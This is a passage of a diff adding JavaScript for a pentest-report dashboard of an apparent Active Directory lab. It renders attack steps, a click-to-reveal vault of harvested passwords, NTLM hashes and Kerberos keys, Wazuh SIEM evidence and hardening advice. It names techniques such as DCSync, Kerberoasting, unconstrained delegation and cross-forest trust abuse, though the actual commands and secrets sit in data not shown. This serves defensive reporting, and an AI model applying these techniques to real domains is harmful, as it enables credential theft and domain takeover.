+    const bg=document.createElementNS(SVGNS,"circle");
+    bg.setAttribute("r",h.r);bg.setAttribute("fill",h.fill);
+    g.appendChild(bg);
+    if(h.icon){
+      const clipId="clip-"+id;
+      const cp=document.createElementNS(SVGNS,"clipPath");
+      cp.setAttribute("id",clipId);
+      const cc=document.createElementNS(SVGNS,"circle");
+      cc.setAttribute("r",h.r-1);
+      cp.appendChild(cc);
+      g.appendChild(cp);
+      const img=document.createElementNS(SVGNS,"image");
+      img.setAttributeNS("http://www.w3.org/1999/xlink","href",h.icon);
+      img.setAttribute("href",h.icon);
+      img.setAttribute("x",-h.r);img.setAttribute("y",-h.r);
+      img.setAttribute("width",h.r*2);img.setAttribute("height",h.r*2);
+      img.setAttribute("clip-path","url(#"+clipId+")");
+      img.setAttribute("preserveAspectRatio","xMidYMid slice");
+      g.appendChild(img);
+    }
+    const c=document.createElementNS(SVGNS,"circle");
+    c.setAttribute("r",h.r);c.setAttribute("fill","none");c.setAttribute("stroke",h.stroke);c.setAttribute("stroke-width","2.8");
+    g.appendChild(c);
+    // labels: name above, ip + role below (kept outside the circle so they never overlap)
+    const mk=(y,t,fs,fill,w,anchor)=>{const x=document.createElementNS(SVGNS,"text");x.setAttribute("y",y);x.setAttribute("text-anchor",anchor||"middle");x.setAttribute("font-size",fs);x.setAttribute("fill",fill);if(w)x.setAttribute("font-weight",w);x.textContent=t;g.appendChild(x);};
+    mk(h.r+12,h.name,"11.5",h.stroke,"700");
+    mk(h.r+22,h.ip,"8.5","#d4d8e0");
+    mk(h.r+32,h.role.includes("Root")?"Root DC":h.role.includes("Child")?"Child DC":h.role.includes("Member")?"Member":h.role.includes("SIEM")?"SIEM":"Attacker","7.5","#918b8c");
+    g.addEventListener("click",()=>showHost(id));
+    svg.appendChild(g);
+  });
+}
+function highlight(ids,flow){
+  const set=new Set(ids||[]);
+  $$(".node").forEach(n=>{
+    n.classList.toggle("active",set.has(n.dataset.host));
+    n.classList.toggle("dim",!!ids&&!set.has(n.dataset.host));
+  });
+  EDGES.forEach(e=>{
+    const both=set.has(e.a)&&set.has(e.b);
+    const inc=set.has(e.a)||set.has(e.b);
+    const active=both||(ids&&ids.length===1&&inc);
+    const el=$("#e-"+e.id);
+    el.classList.toggle("active",!!active);
+    el.classList.toggle("flow",!!(flow&&both));
+    el.classList.toggle("dim",!!ids&&!active);
+  });
+}
+
+/* ---------- secrets reveal ---------- */
+function sv(v){return `<span class="secret" onclick="this.classList.toggle('shown')"><span class="mask">•••••• reveal</span><span class="val">${esc(v)}</span></span>`;}
+
+/* ---------- context: host ---------- */
+function bhComputer(name){return (BH.computers||[]).find(c=>c.name===name);}
+function hostLoot(id){
+  if(id==="winterfell")return {t:"Child DCSync loot (pulled from this DC)",hashes:SEC.childHashes,aes:(SEC.aesKeys||[]).filter(a=>a[0].includes("child")),pw:(SEC.passwords||[]).filter(p=>p[1]==="north")};
+  if(id==="castelblack")return {t:"LSA / local secrets",lsa:SEC.lsa,pw:(SEC.passwords||[]).filter(p=>["jeor.mormont","sql_svc"].includes(p[0]))};
+  if(id==="kingslanding")return {t:"Root DCSync loot",hashes:SEC.rootHashes,aes:(SEC.aesKeys||[]).filter(a=>a[0].includes("root")),pw:(SEC.passwords||[]).filter(p=>p[1].indexOf("root")>=0||p[0]==="KINGHODOR")};
+  return null;
+}
+function showHost(id){
+  $$(".step").forEach(o=>o.classList.remove("sel","open"));
+  highlight([id]); $("#topoTag").textContent=HOSTS[id].name;
+  const h=HOSTS[id];
+  let s=`<div class="ctxhead"><h3>${esc(h.name)}</h3><span class="role">${esc(h.role)}</span></div>`;
+  s+=`<div class="kv"><b>IP:</b> <span class="mono">${h.ip}</span>${h.pub?` · <b>Public:</b> <span class="mono">${h.pub}</span>`:""}</div>`;
+  s+=`<div class="kv"><b>Domain:</b> ${esc(h.domain)}</div>`;
+  s+=`<div class="kv"><b>SIEM:</b> <span class="mono">${esc(h.siem)}</span></div>`;
+  if(h.note)s+=`<div class="kv">${esc(h.note)}</div>`;
+  const bc=h.bh?bhComputer(h.bh):null;
+  if(bc){s+=`<h4 class="lbl">BloodHound profile</h4><div class="kv"><b>OS:</b> ${esc(bc.os)}</div>`;
+    s+=`<ul class="tight">`+bc.flags.map(f=>`<li class="${/UNCONSTRAINED|GenericAll/i.test(f)?"flag crit":"flag"}">${esc(f)}</li>`).join("")+`</ul>`;}
+  if(h.tools){s+=`<h4 class="lbl">Tooling</h4><ul class="tight">`+h.tools.map(t=>`<li>${esc(t)}</li>`).join("")+`</ul>`;}
+  if(h.users){s+=`<h4 class="lbl">Users &amp; privilege</h4>`+h.users.map(u=>`<div class="u"><i style="background:${PRIV[u[0]]}"></i><span class="uname">${esc(u[1])}</span><span class="udesc">${esc(u[2])}</span></div>`).join("");}
+  const loot=hostLoot(id);
+  if(loot){s+=`<h4 class="lbl">${esc(loot.t)} <span style="font-weight:400;color:var(--faint)">· click to reveal</span></h4>`;
+    if(loot.pw&&loot.pw.length){s+=`<table class="ev"><tr><th>Account</th><th>Password</th><th>Use</th></tr>`+loot.pw.map(p=>`<tr><td class="mono">${esc(p[0])}</td><td>${sv(p[2])}</td><td class="col-unlocks">${esc(p[4])}</td></tr>`).join("")+`</table>`;}
+    if(loot.hashes&&loot.hashes.length){s+=`<table class="ev"><tr><th>Account</th><th>RID</th><th>NTLM (LM:NT)</th></tr>`+loot.hashes.map(r=>`<tr><td class="mono">${esc(r[0])}</td><td>${r[1]}</td><td>${sv(r[2])}</td></tr>`).join("")+`</table>`;}
+    if(loot.aes&&loot.aes.length){s+=`<table class="ev"><tr><th>Account</th><th>AES256</th></tr>`+loot.aes.map(r=>`<tr><td class="mono">${esc(r[0])}</td><td>${sv(r[2])}</td></tr>`).join("")+`</table>`;}
+    if(loot.lsa&&loot.lsa.length){s+=`<table class="ev"><tr><th>Secret</th><th>Value</th></tr>`+loot.lsa.map(r=>`<tr><td class="mono">${esc(r[0])}</td><td>${sv(r[1])}</td></tr>`).join("")+`</table>`;}
+  }
+  s+=`<h4 class="lbl">Wazuh alerts → evidence</h4><ul class="tight">`+h.alerts.map(a=>`<li>${hardLinkBtn(evidToHard(a[1]),esc(a[0])+' <span class="arrow">→</span>')}</li>`).join("")+`</ul>`;
+  s+=proofBlock(proofItems("hosts",id));
+  $("#context").innerHTML=s;
+}
+
+/* ---------- context: step ---------- */
+function evBlock(ev){
+  if(!ev)return `<div class="empty">No matching events were indexed.</div>`;
+  let s="";
+  const rules=Object.entries(ev.byRule||{});
+  if(rules.length){s+=`<div class="chips">`+rules.map(([k,v])=>{const o=typeof v==="object"?v:{count:v};return `<span class="chip"${o.desc?` title="${esc(o.desc)}"`:ruleTitle(k)}>rule ${k} ×${o.count}${o.level!=null&&o.level!==""?` <span class="lvl ${lvlClass(o.level)}">L${o.level}</span>`:""}</span>`;}).join("")+`</div>`;}
+  const users=Object.entries(ev.byUser||{});
+  if(users.length){s+=`<div class="chips">`+users.slice(0,8).map(([k,v])=>`<span class="chip">${esc(k)} ×${v}</span>`).join("")+`</div>`;}
+  const src=Object.entries(ev.bySrc||{});
+  if(src.length){s+=`<div class="chips">`+src.map(([k,v])=>`<span class="chip red">src ${esc(k)} ×${v}</span>`).join("")+`</div>`;}
+  if(ev.samples&&ev.samples.length){
+    s+=`<div class="scroll scrollx"><table class="ev"><tr><th>Time (UTC)</th><th>Agent</th><th>Rule</th><th>Lvl</th><th>Evt</th><th>Target</th><th>Src</th><th>Description</th></tr>`+
+      ev.samples.map(r=>`<tr><td class="mono">${esc(r[0])}</td><td>${esc(r[1])}</td><td class="mono"${ruleTitle(r[2])}>${esc(r[2])}</td><td><span class="lvl ${lvlClass(r[3])}">${esc(r[3])}</span></td><td class="mono"${evtTitle(r[4])}>${esc(r[4])}</td><td>${esc(r[5])}</td><td class="mono">${esc(r[6])}</td><td class="col-desc">${esc(r[7])}</td></tr>`).join("")+`</table></div>`;
+  }
+  if(ev.note)s+=`<div class="src">▸ ${esc(ev.note)}</div>`;
+  return s;
+}
+function showStep(n){
+  const st=STEPS.find(x=>x.n==n); if(!st)return;
+  const ev=EVID[st.evid];
+  const hd=HARDENING.find(h=>h.id===st.harden)||{};
+  const loot=STEP_LOOT[n]||{};
+  const narr=NARRATIVES[n]||"";
+  let s=`<div class="ctxhead"><span class="ph ph-${st.ph}">${st.ph}</span><h3>Step ${st.n}: ${esc(st.t)}</h3></div>`;
+  s+=`<div class="kv"><b>Flow:</b> ${st.hosts.map(h=>esc(HOSTS[h].name)).join(' <span class="arrow">→</span> ')}</div>`;
+  s+=`<pre class="cmd">${fmtCmd(st.cmd)}</pre>`;
+  s+=`<div class="loot"><b>▸ Gained:</b> ${esc(st.loot)}</div>`;
+  if(st.logNote)s+=`<div class="logctx"><b>What the SIEM can (and cannot) show here:</b> ${esc(st.logNote)}</div>`;
+  if(loot.label){s+=`<div class="steplinks"><span class="steplabel">Loot:</span><button type="button" class="xchip" onclick="revealSecret('${loot.type||""}','${esc(loot.account||loot.domain||"")}')">${esc(loot.label)} →</button></div>`;}
+  s+=`<div class="steplinks"><span class="steplabel">Fix:</span><button type="button" class="xchip" onclick="jumpHard('${st.harden}')">${esc(hd.title||st.harden)} →</button></div>`;
+  if(narr){s+=`<div class="narr-toggle" onclick="toggleNarr(${n})"><i>▸</i> What happened</div><div class="narr-body" id="narr${n}">${mdInline(narr)}</div>`;}
+  s+=proofBlock(proofsForStep(n));
+  s+=`<h4 class="lbl">Original Wazuh evidence${ev&&ev.first?` · ${esc(ev.first)} → ${esc(ev.last)}`:""}${ev?` · ${ev.total} events`:""}</h4>`;
+  s+=evBlock(ev);
+  $("#context").innerHTML=s;
+}
+function selectStep(n){
+  const st=STEPS.find(x=>x.n==n); if(!st)return;
+  $$(".step").forEach(o=>{o.classList.toggle("sel",o.dataset.n==n);o.classList.toggle("open",o.dataset.n==n);});
+  highlight(st.hosts,true);
+  $("#topoTag").textContent=`step ${n} · ${st.t}`;
+  showStep(n);
+}
+
+/* ---------- steps list ---------- */
+function renderSteps(){
+  $("#steps").innerHTML=STEPS.map(s=>{
+    const pr=proofsForStep(s.n);
+    const proof=pr.length?proofBlock(pr,"Nachweis ("+pr.length+")"):"";
+    return `
+    <li class="step" data-n="${s.n}">
+      <div class="hd"><span class="num">${s.n}</span>
+        <div><div class="t"><span class="ph ph-${s.ph}">${s.ph}</span>${esc(s.t)}</div>
+        <div class="m">${s.hosts.map(h=>HOSTS[h].name).join(" · ")}</div></div></div>
+      <div class="body"><pre class="cmd">${fmtCmd(s.cmd)}</pre><div class="loot"><b>▸ Gained:</b> ${esc(s.loot)}</div>${proof}</div>
+    </li>`;
+  }).join("");
+  $$(".step").forEach(li=>li.querySelector(".hd").onclick=()=>selectStep(+li.dataset.n));
+}
+
+/* ---------- domains (BloodHound-rich) ---------- */
+let activeDom="north";
+function renderDomTabs(){
+  $("#domTabs").innerHTML=Object.entries(DOMAINS).map(([k,d])=>`<button data-d="${k}" class="${k===activeDom?"on":""}">${esc(d.label)}</button>`).join("");
+  $$("#domTabs button").forEach(b=>b.onclick=()=>{activeDom=b.dataset.d;renderDomTabs();renderDomPanel();});
+}
+function renderDomPanel(){
+  const d=DOMAINS[activeDom];
+  let s=`<div class="ctxhead"><h3>${esc(d.full)}</h3><span class="role">${esc(d.dc)}</span></div>`;
+  s+=`<div class="kv"><b>SID:</b> <span class="hash">${esc(d.sid)}</span></div>`;
+  s+=`<div class="kv"><b>Trust:</b> ${esc(d.trust)}</div>`;
+  s+=`<h4 class="lbl">Privileged users</h4>`+d.users.map(u=>`<div class="u"><i style="background:${PRIV[u[0]]}"></i><span class="uname">${esc(u[1])}</span><span class="udesc">${esc(u[2])}</span></div>`).join("");
+  // BloodHound privileged group membership
+  const grps=(BH.groups||[]).filter(g=>activeDom==="root"?/Enterprise/i.test(g.name):!/Enterprise/i.test(g.name));
+  if(grps.length){s+=`<h4 class="lbl">Group membership (BloodHound)</h4>`+grps.map(g=>`<div class="kv"><b>${esc(g.name)}:</b> ${g.members.map(m=>`<span class="chip">${esc(m)}</span>`).join(" ")}</div>`).join("");}
+  if(activeDom==="north"){
+    s+=`<h4 class="lbl">Abused ACL edges (BloodHound)</h4><ul class="tight">`+(BH.acls||[]).map(a=>`<li><b>${esc(a.principal)}</b> — ${a.rights.join(", ")} → <b>${esc(a.target)}</b><br><span class="udesc">${esc(a.note)}</span></li>`).join("")+`</ul>`;
+    s+=`<h4 class="lbl">Delegation</h4><ul class="tight">`+(BH.delegation||[]).map(x=>`<li><b>${esc(x.principal)}</b> · ${esc(x.type)} → ${esc(x.to)} <span class="udesc">(${x.spns.join(", ")}) — ${esc(x.note)}</span></li>`).join("")+`</ul>`;
+    s+=`<h4 class="lbl">Kerberoastable</h4><div class="chips">`+(BH.kerberoastable||[]).map(k=>`<span class="chip">${esc(k)}</span>`).join("")+`</div>`;
+    s+=`<div class="src">▸ ${esc(BH.descLeak||"")}</div>`;
+  } else {
+    s+=`<h4 class="lbl">Trust abuse</h4><div class="kv">${esc(BH.trust.note)}</div>`;
+  }
+  s+=`<h4 class="lbl">Related alerts → evidence</h4><ul class="tight">`+d.alerts.map(a=>{const e=EVID[a[1]];const c=e?e.total:"0";return `<li>${hardLinkBtn(evidToHard(a[1]),esc(a[0])+' — <b>'+c+'</b> event(s) <span class="arrow">→</span>')}</li>`;}).join("")+`</ul>`;
+  s+=proofBlock(proofItems("domains",activeDom));
+  $("#domPanel").innerHTML=s;
+}
+
+/* ---------- secrets vault ---------- */
+function isRootCredDomain(domain, accountLabel){
+  const d=(domain||"").toLowerCase();
+  const a=(accountLabel||"").toLowerCase();
+  if(a.includes("(root)"))return true;
+  if(d.includes("north"))return false;
+  return d.includes("sevenkingdoms")||d.includes("root");
+}
+function stepForCred(account, domain){
+  const acc=account.toLowerCase();
+  const root=isRootCredDomain(domain, account);
+  if(acc.includes("brandon.stark"))return 1;
+  if(acc.includes("jeor.mormont"))return 2;
+  if(acc.includes("samwell.tarly"))return 3;
+  if(acc.includes("sql_svc"))return 5;
+  if(acc.includes("kinghodor"))return 13;
+  if(acc.includes("sevenkingdoms$"))return 9;
+  if(acc.includes("goadmin")||acc.includes("krbtgt"))return root?11:9;
+  for(const [n,loot] of Object.entries(STEP_LOOT)){
+    if(loot.account===account||loot.domain===account||loot.label?.includes(account))return n;
+  }
+  return null;
+}
+function renderVault(){
+  const cards=[];
+  const pwRows=(SEC.passwords||[]).map(p=>{
+    return `<tr><td class="mono">${esc(p[0])}</td><td class="plain">${esc(p[1])}</td><td>${sv(p[2])}</td><td class="col-unlocks">${esc(p[4])}</td><td class="col-from"><div class="from-cell">${stepLink(stepForCred(p[0], p[1]))}</div></td></tr>`;
+  }).join("");
+  cards.push(`<div class="vcard"><div class="vt">Plaintext passwords <span class="chip">${(SEC.passwords||[]).length}</span></div><div class="vb"><table class="ev vault-tbl"><tr><th>Account</th><th>Domain</th><th>Password</th><th>Unlocks</th><th>From</th></tr>${pwRows}</table></div></div>`);
+  const chRows=(SEC.childHashes||[]).map(r=>{
+    const note=r[3]?`<span class="cell-static">${esc(r[3])}</span>`:"";
+    return `<tr><td class="mono">${esc(r[0])}</td><td class="plain">${r[1]}</td><td>${sv(r[2])}</td><td class="col-from"><div class="from-cell">${note}${stepLink(stepForCred(r[0], "north.sevenkingdoms.local"))}</div></td></tr>`;
+  }).join("");
+  cards.push(`<div class="vcard"><div class="vt">Child NTLM hashes (DCSync) <span class="chip">${(SEC.childHashes||[]).length}</span></div><div class="vb"><table class="ev vault-tbl"><tr><th>Account</th><th>RID</th><th>LM:NT</th><th>From</th></tr>${chRows}</table></div></div>`);
+  const rtRows=(SEC.rootHashes||[]).map(r=>{
+    const note=r[3]?`<span class="cell-static">${esc(r[3])}</span>`:"";
+    return `<tr><td class="mono">${esc(r[0])}</td><td class="plain">${r[1]}</td><td>${sv(r[2])}</td><td class="col-from"><div class="from-cell">${note}${stepLink(stepForCred(r[0], "sevenkingdoms.local"))}</div></td></tr>`;
+  }).join("");
+  cards.push(`<div class="vcard"><div class="vt">Root NTLM hashes (raiseChild) <span class="chip red">forest</span></div><div class="vb"><table class="ev vault-tbl"><tr><th>Account</th><th>RID</th><th>LM:NT</th><th>From</th></tr>${rtRows}</table></div></div>`);
+  const aeRows=(SEC.aesKeys||[]).map(r=>{
+    return `<tr><td class="mono">${esc(r[0])}</td><td>${sv(r[2])}</td><td class="col-unlocks">${esc(r[3])}</td><td class="col-from"><div class="from-cell">${stepLink(stepForCred(r[0], r[0]))}</div></td></tr>`;
+  }).join("");
+  cards.push(`<div class="vcard"><div class="vt">Kerberos AES256 keys <span class="chip">${(SEC.aesKeys||[]).length}</span></div><div class="vb"><table class="ev vault-tbl"><tr><th>Account</th><th>AES256</th><th>Use</th><th>From</th></tr>${aeRows}</table></div></div>`);
+  const lsRows=(SEC.lsa||[]).map(r=>{
+    return `<tr><td class="mono">${esc(r[0])}</td><td>${sv(r[1])}</td><td class="col-from"><div class="from-cell">${stepLink(stepForCred(r[0], "north"))}</div></td></tr>`;
+  }).join("");
+  cards.push(`<div class="vcard"><div class="vt">LSA / cache (Castelblack) <span class="chip">${(SEC.lsa||[]).length}</span></div><div class="vb"><table class="ev vault-tbl"><tr><th>Secret</th><th>Value</th><th>From</th></tr>${lsRows}</table>${proofBlock(proofsForStep(5))}</div></div>`);
+  const sidRows=(SEC.sids||[]).map(r=>`<tr><td>${esc(r[0])}</td><td class="hash">${esc(r[1])}</td></tr>`).join("");
+  cards.push(`<div class="vcard"><div class="vt">Key SIDs <span class="chip">${(SEC.sids||[]).length}</span></div><div class="vb"><table class="ev vault-tbl"><tr><th>Name</th><th>SID</th></tr>${sidRows}</table></div></div>`);
+  $("#vault").innerHTML=cards.join("");
+}
+
+/* ---------- hardening ---------- */
+function stepsFor(id){return STEPS.filter(s=>s.harden===id);}
+
+/* mini topology strip — animated path the fix protects */
+function miniNode(id,x,y){
+  const h=HOSTS[id]; if(!h)return "";
+  let s=`<g class="mn">`;
+  if(h.icon){
+    const cid="mc-"+id+"-"+Math.round(x)+"-"+Math.round(y);
+    s+=`<clipPath id="${cid}"><circle cx="${x}" cy="${y}" r="13"/></clipPath>`;
+    s+=`<circle cx="${x}" cy="${y}" r="13" fill="${h.fill}"/>`;
+    s+=`<image href="${h.icon}" x="${x-13}" y="${y-13}" width="26" height="26" clip-path="url(#${cid})" preserveAspectRatio="xMidYMid slice"/>`;
+    s+=`<circle cx="${x}" cy="${y}" r="13" fill="none" stroke="${h.stroke}" stroke-width="2.5"/>`;
+  } else {
+    s+=`<circle cx="${x}" cy="${y}" r="13" fill="${h.fill}" stroke="${h.stroke}" stroke-width="2.5"/>`;
+  }
+  s+=`<text class="mn-name" x="${x}" y="${y+25}" text-anchor="middle" font-size="9.5">${esc(h.name)}</text>`;
+  s+=`<text class="mn-sub" x="${x}" y="${y+35}" text-anchor="middle" font-size="7.5">${esc(h.ip)}</text></g>`;
+  return s;
+}
+function miniTopo(cfg,isGap){
+  if(!cfg||!cfg.t||!cfg.t.length)return "";
+  const t=cfg.t, n=t.length;
+  const W=460, H=n>=3?160:(n===2?128:96);
+  if(cfg.type==="trust"){
+    const y=H/2-6, x1=140, x2=320;
+    return `<svg class="mtopo" viewBox="0 0 ${W} ${H}" preserveAspectRatio="xMidYMid meet">`+
+      `<text class="mlabel" x="${(x1+x2)/2}" y="${y-22}" text-anchor="middle" font-size="9" fill="var(--blue)">bidirectional trust · SID filter OFF</text>`+
+      `<line x1="${x1+13}" y1="${y}" x2="${x2-13}" y2="${y}" class="medge trust flow"/>`+
+      miniNode(t[0],x1,y)+miniNode(t[1],x2,y)+`</svg>`;
+  }
+  if(cfg.type==="kdc"){
+    const x=W/2, y=H/2;
+    return `<svg class="mtopo" viewBox="0 0 ${W} ${H}" preserveAspectRatio="xMidYMid meet">`+
+      `<text class="mlabel" x="${x}" y="${y-32}" text-anchor="middle" font-size="9" fill="var(--faint)">::1 loopback · 10k+ self-issued 4769</text>`+
+      `<path d="M ${x-9} ${y-13} C ${x-50} ${y-50}, ${x+50} ${y-50}, ${x+9} ${y-13}" class="medge gap flow"/>`+
+      miniNode(t[0],x,y)+`</svg>`;
+  }
+  const ax=60, ay=H/2, tx=380;
+  const ys = n===1?[H/2] : n===2?[H*0.30,H*0.72] : [H*0.22,H*0.5,H*0.78];
+  const cls = isGap?"medge gap flow":"medge atk flow";
+  let edges="",nodes=miniNode("jumpbox",ax,ay);
+  t.forEach((id,i)=>{
+    edges+=`<line x1="${ax+13}" y1="${ay}" x2="${tx-13}" y2="${ys[i]}" class="${cls}"/>`;
+    nodes+=miniNode(id,tx,ys[i]);
+    if(isGap)nodes+=`<text x="${(ax+tx)/2}" y="${(ay+ys[i])/2-4}" text-anchor="middle" font-size="11" fill="var(--red)">⚠</text>`;
+  });
+  return `<svg class="mtopo" viewBox="0 0 ${W} ${H}" preserveAspectRatio="xMidYMid meet">${edges}${nodes}</svg>`;
+}
+function consBadge(c){
+  if(c==="required")return `<span class="cons cons-req">⛒ Non-negotiable</span>`;
+  if(c==="debate")return `<span class="cons cons-deb">◐ Open for discussion</span>`;
+  return "";
+}
+function renderHard(){
+  $("#hard").innerHTML=HARDENING.map(h=>{
+    const ev=EVID[h.evid];
+    const total=ev?ev.total:0;
+    const isGap=h.status==="gap";
+    const stamp=isGap?`<span class="evstamp ev-gap">DETECTION GAP</span>`:`<span class="evstamp ev-on">${total} events</span>`;
+    const rel=stepsFor(h.id);
+    const stepChips=rel.map(s=>`<button type="button" class="xchip" onclick="event.stopPropagation();jumpStep(${s.n})">step ${s.n}: ${esc(s.t)}</button>`).join("");
+    const hostSet=[...new Set(rel.flatMap(s=>s.hosts).filter(x=>x!=="jumpbox"))];
+    const hostChips=hostSet.map(x=>`<button type="button" class="xchip" onclick="event.stopPropagation();jumpHost('${x}')">⌂ ${esc(HOSTS[x].name)}</button>`).join("");
+    const consCls=h.consensus==="required"?"req":(h.consensus==="debate"?"deb":"");
+    const mtag=isGap?`<div class="mtag"><span class="gapdot">●</span> dashed red = attack path that produced <b>no log</b> (detection gap)</div>`
+                    :`<div class="mtag"><span class="okdot">●</span> solid red = attack path the SIEM <b>did</b> record</div>`;
+    return `<div class="hcard ${consCls}" data-id="${h.id}">
+      <div class="hh"><div><div class="htitle">${esc(h.title)}</div><div class="hmeta">${esc(h.scope)} · ${esc(h.mitre)}</div></div><div class="hstamps">${stamp}${consBadge(h.consensus)}</div></div>
+      <div class="hbody">
+        <div class="htopo-wrap"><h4 class="lbl">Topology touchpoints — animated path used</h4>${miniTopo(h.topo,isGap)}${mtag}</div>
+        <div class="hgrid">
+        <div>
+          <div class="why">${h.why}</div>
+          <div class="fix"><b>Fix:</b> ${esc(h.fix)}</div>
+          ${h.debate?`<div class="debate-note"><b>◐ Diskussionsraum:</b> ${h.debate}</div>`:""}
+          ${rel.length?`<h4 class="lbl">Exploited in</h4><div class="xref">${stepChips}${hostChips}</div>`:""}
+          <div class="src"><b>Threat-hunting query:</b></div><div class="qbox">${esc(h.query)}</div>
+          <div class="src">Expected signal: <b>${esc(h.expect)}</b></div>
+          ${proofBlock(proofItems("hardening",h.id))}
+        </div>
+        <div>
+          <h4 class="lbl">Original Wazuh logs${ev&&ev.first?` · ${esc(ev.first)} → ${esc(ev.last)}`:""}${ev?` · ${ev.total} events`:""}</h4>
+          ${evBlock(ev)}
+        </div>
+      </div></div>
+    </div>`;
+  }).join("");
+  $$(".hcard .hh").forEach(hh=>hh.onclick=()=>{
+    const card=hh.parentElement;
+    card.classList.toggle("open");
+    if(card.classList.contains("open")){
+      const h=HARDENING.find(x=>x.id===card.dataset.id);
+      if(h&&h.topo&&h.topo.t){
+        const set=h.topo.type==="attack"?["jumpbox",...h.topo.t]:h.topo.t;
+        highlight(set,true);
+        $("#topoTag").textContent="hardening · "+h.title;
+      }
+    }
+  });
+}
+
+/* ---------- narrative toggle ---------- */
+function toggleNarr(n){
+  const tog=document.querySelector(`.narr-toggle`);
+  const bod=document.getElementById(`narr${n}`);
+  if(tog&&bod){tog.classList.toggle("open");bod.classList.toggle("open");}
+}
+
+/* ---------- Kerberos noise panel ---------- */
+function renderKerbNoise(){
+  const k=KERB_NOISE;
+  let s=`<div class="ctxhead"><h3>${esc(k.title||"Kerberos 4769 noise")}</h3></div>`;
+  s+=`<div class="kv"><b>Total volume:</b> ${esc(k.total||"")}</div>`;
+  s+=`<div class="kv"><b>Peak user:</b> <span class="mono">${esc(k.peak_user||"")}</span> — ${esc(k.peak_count||"")} events</div>`;
+  s+=`<div class="kv"><b>Source IP:</b> <span class="mono">${esc(k.source||"")}</span></div>`;
+  s+=`<div class="kv"><b>Agent:</b> ${esc(k.agent||"")}</div>`;
+  s+=`<div class="kv"><b>Timespan:</b> ${esc(k.timespan||"")}</div>`;
+  s+=`<h4 class="lbl">Problem</h4><div class="why">${esc(k.problem||"")}</div>`;
+  s+=`<h4 class="lbl">Fix</h4><div class="fix">${esc(k.fix||"")}</div>`;
+  s+=`<h4 class="lbl">Real signal</h4><div class="kv">${esc(k.real_signal||"")}</div>`;
+  if(k.samples&&k.samples.length){
+    s+=`<h4 class="lbl">Sample events (first 3)</h4><table class="ev"><tr><th>Timestamp</th><th>Agent</th><th>Rule</th><th>Event</th><th>User</th><th>Source IP</th></tr>`;
+    k.samples.slice(0,3).forEach(r=>s+=`<tr><td>${esc(r[0])}</td><td>${esc(r[1])}</td><td>${esc(r[2])}</td><td>${esc(r[3])}</td><td class="mono">${esc(r[4])}</td><td class="mono">${esc(r[5])}</td></tr>`);
+    s+=`</table>`;
+  }
+  $("#kerbnoise").innerHTML=s;
+}
+
+/* ---------- cross-link jumps ---------- */
+function flash(el){if(!el)return;el.classList.remove("flash");void el.offsetWidth;el.classList.add("flash");}
+function jumpHard(id){const c=document.querySelector(`.hcard[data-id="${id}"]`);if(!c)return;c.classList.add("open");c.scrollIntoView({behavior:"smooth",block:"center"});flash(c);}
+function jumpStep(n){selectStep(n);const li=document.querySelector(`.step[data-n="${n}"]`);if(li){li.scrollIntoView({behavior:"smooth",block:"center"});flash(li);}}
+function jumpHost(id){showHost(id);const card=$("#topo").closest(".card");card.scrollIntoView({behavior:"smooth",block:"start"});flash($("#context"));}
+function revealSecret(type,account){
+  // Navigate to vault and reveal the matching secret
+  const vault=$("#vault");
+  vault.scrollIntoView({behavior:"smooth",block:"start"});
+  setTimeout(()=>{
+    const cells=$$(".vcard .secret");
+    cells.forEach(c=>{
+      const row=c.closest("tr");
+      if(row&&row.textContent.includes(account)){c.click();flash(row);}
+    });
+  },400);
+}
+
+/* ---------- init ---------- */
+renderKPIs();renderLegend();buildTopo();
+renderDomTabs();renderDomPanel();
+renderKerbNoise();
+renderVault();renderSteps();renderHard();
+initImgLightbox();
+$("#revealAll").onclick=function(){const on=this.dataset.on==="1";$$(".secret").forEach(s=>s.classList.toggle("shown",!on));this.dataset.on=on?"0":"1";this.textContent=on?"Reveal all":"Hide all";};
+selectStep(1);
+(function(){const m=(location.hash||"").match(/open=([\w]+)/);if(m){const c=document.querySelector(`.hcard[data-id="${m[1]}"]`);if(c){c.classList.add("open");c.scrollIntoView({block:"center"});}}})();
+</script>
+</body>
+</html>
